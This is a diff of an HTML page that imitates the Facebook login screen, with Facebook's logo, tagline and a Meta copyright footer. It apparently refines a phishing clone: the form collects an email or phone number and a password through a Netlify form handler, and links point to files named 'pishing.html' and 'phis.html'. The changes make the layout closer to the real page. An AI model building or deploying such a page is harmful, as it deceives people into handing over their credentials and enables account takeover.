@@ -5,95 +5,84 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login</title>
-    <link rel="stylesheet" type="text/css" href="index.css" />
+    <link rel="stylesheet" type="text/css" href="tester1.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">    
 </head>
 <body>
+    <div class="container h-100">
+        <div class="row align-items-center h-100">
+            <!-- Facebook Image Column -->
+            <div class="col-md-7">
+                <div class="facebookimg">
+                    <img class="fb_logo img-fluid" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
+                </div>
+                <p>Facebook helps you connect and share with the people in your life.</p>
+            </div>
 
-    <!-- Left sidebar -->
-    <div class="left-sidebar">
-        <h1>Facebook</h1>
-        <p>Facebook helps you connect and share <br>with the people in your life.</p>
-    </div>
-
-    <div id="content">
-
-    <!-- Login box -->
-    <div class="container">
-        <div class="row justify-content-center">
-            <div class="col-md-6" id="loginboks">
-                <form name="contact" method="POST" data-netlify="true">
-                    <input type="hidden" name="form-name" value="contact" />
-
-                    <div class="form-group">
-                        <label for="brukernavn">Email or mobile number</label>
-                        <input type="text" class="form-control" name="brukernavn" id="brukernavn" placeholder="Email or mobile number">
-                    </div>
-                    
-                    <div class="form-group">
-                        <input type="password" class="form-control" name="passord" id="passord" placeholder="Password">
-                    </div>
-                     <br>
-            
-
-                    <!-- Facebook login button -->
-                          <button class="btn btn-primary btn-block facebook-login" type="submit">
-                          <i class="fab fa-facebook-square"></i> Log in
-
-                    </button>                   
-
-                </form>
-
+            <!-- Login Form Column -->
+            <div class="col-md-5">
+                <div id="loginboks">
+                    <form name="contact" method="POST" data-netlify="true">
+                        <input type="hidden" name="form-name" value="contact" />
+                        <div class="form-group">
+                            <input type="text" class="form-control" name="brukernavn" id="brukernavn" placeholder="Email or mobile number">
+                        </div>
+                        <div class="form-group">
+                            <input type="password" class="form-control" name="passord" id="passord" placeholder="Password">
+                        </div>
+                        <button class="btn btn-primary btn-block facebook-login" type="submit">
+                            <i class="fab fa-facebook-square"></i> Log in
+                        </button>
+                        <br>
+                        <a href="forgetPasswordController" class="forgotten-passwd">Forgotten password?</a>
+                        <br>
+                        <br>
+                        <button type="button" class="btn btn-success btn-block">Create new account</button>
+                    </form>
+                </div>
             </div>
         </div>
     </div>
-</div>
+
+    <div class="text-center">
+        <p><strong>Create a Page</strong> for a celebrity, brand or business.</p>
+    </div>
     <footer class="footer bg-light">
-    <div class="container">
-        <div class="row">
-            <div class="col-12">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <!-- Language Selection Links -->
+                    <ul class="list-inline text-center language-selection">
+                        <li class="list-inline-item"><a href="pishing.html">Lietuvių</a></li>
+                        <li class="list-inline-item"><a href="#">English (UK)</a></li>
+                        <li class="list-inline-item"><a href="#">Norsk (bokmål)</a></li>
+                        <li class="list-inline-item"><a href="#">Norsk (nynorsk)</a></li>
 
-                 <!-- Language Selection Links -->
-                <ul class="list-inline text-center language-selection">
-                    <li class="list-inline-item"><a href="pishing.html">Lietuvių</a></li>
-                    <li class="list-inline-item"><a href="#">English (UK)</a></li>
-                    <li class="list-inline-item"><a href="#">Norsk (bokmål)</a></li>
-                    <li class="list-inline-item"><a href="#">Norsk (nynorsk)</a></li>
-                    <!-- ... other list items for each language ... -->
-                    <li class="list-inline-item"><a href="#">Français (France)</a></li>
-                </ul>
-
-                <ul class="list-inline text-center">
-                    <li class="list-inline-item"><a href="phis.html">Sign Up</a></li>
-                    <li class="list-inline-item"><a href="phis.html">Log in</a></li>
-                    <li class="list-inline-item"><a href="phis.html">Messenger</a></li>
-                    <!-- ...other list items... -->
-                    <li class="list-inline-item"><a href="phis.html">Terms</a></li>
-                    <li class="list-inline-item"><a href="phis.html">Help</a></li>
-                    <li class="list-inline-item"><a href="phis.html">Contact</a></li>
-                </ul>
-
-               
-
-                <p class="text-center">
-                    <small>Settings - Activity log</small>
-                </p>
-                <p class="text-center">
-                    <small>Meta © 2023</small>
-                </p>
+                        <!-- ... other list items for each language ... -->
+                        <li class="list-inline-item"><a href="#">Français (France)</a></li>
+                    </ul>
+                    <ul class="list-inline text-center">
+                        <li class="list-inline-item"><a href="phis.html">Sign Up</a></li>
+                        <li class="list-inline-item"><a href="phis.html">Log in</a></li>
+                        <li class="list-inline-item"><a href="phis.html">Messenger</a></li>
+                        <!-- ...other list items... -->
+                        <li class="list-inline-item"><a href="phis.html">Terms</a></li>
+                        <li class="list-inline-item"><a href="phis.html">Help</a></li>
+                        <li class="list-inline-item"><a href="phis.html">Contact</a></li>
+                    </ul>
+                    <p class="text-center">
+                        <small>Settings - Activity log</small>
+                    </p>
+                    <p class="text-center">
+                        <small>Meta © 2023</small>
+                    </p>
+                </div>
             </div>
         </div>
-    </div>
-</footer>
-
-
-
-    <!-- Include Bootstrap JS and Popper.js -->
+    </footer>
     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.4/dist/umd/popper.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 </body>
 </html>
-
-
